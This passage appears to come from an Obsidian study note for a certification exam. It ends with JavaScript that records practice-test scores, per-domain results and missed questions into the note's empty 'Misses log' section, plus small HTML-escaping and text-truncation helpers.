      const entry = `### [${date}] Attempt\n- **MCQ:** ${totalCorrect} / ${total} (${pct.toFixed(1)}%)\n- **PBQ items:** ${pbqItemsCorrect} / ${pbqTotalItems}\n- **By domain:**\n${domainLines}\n- **PBQs:**\n${pbqLines}\n- **Missed MCQs:**\n${missLines}\n`;
      const placeholder = "*(none yet — fill in after the first session: date, score, themes from missed Qs)*";
      app.vault.read(file).then(current => {
        const updated = current.includes(placeholder)
          ? current.replace(placeholder, entry.trimEnd())
          : current.trimEnd() + "\n\n" + entry;
        return app.vault.modify(file, updated);
      }).catch(e => console.error("Persist failed:", e));
    }
  } catch (e) {
    console.error("Persist failed:", e);
  }
};

function escapeHtml(s) {
  return (s || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function truncate(s, n) {
  return s.length > n ? s.slice(0, n - 1) + "…" : s;
}
```


---

## Misses log

*(none yet — fill in after the first session: date, score, themes from missed Qs)*
